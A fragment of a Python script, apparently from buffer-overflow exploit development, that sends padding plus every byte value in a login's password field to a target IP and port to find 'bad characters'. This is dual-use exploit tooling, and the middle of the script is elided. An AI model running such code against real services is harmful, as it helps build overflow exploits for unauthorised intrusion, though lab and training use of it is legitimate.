#! /usr/bin/python3
## This program sends a string of every possible instruction to identify potential bad chars. 
## It has following options to take input.
## ## -i(IP address), -p (port number), -a(amount of A)
...
s.send(USER.encode())
s.recv(1024)
s.send(PASS.encode() + string.encode() + badchars+newline.encode())
